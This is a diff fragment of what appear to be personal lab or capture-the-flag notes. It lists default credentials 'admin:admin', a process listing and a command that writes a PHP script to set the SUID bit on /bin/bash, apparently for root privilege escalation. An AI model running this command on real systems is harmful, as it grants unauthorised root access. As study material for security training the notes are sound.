@@ -14,6 +14,7 @@ admin:admin
 
 `ps faux`
 ![Pasted image 20250119140156](../../Fotos/Pasted%20image%2020250119140156.png)
+
 ![Pasted image 20250119140200](../../Fotos/Pasted%20image%2020250119140200.png)
 
 `echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php`
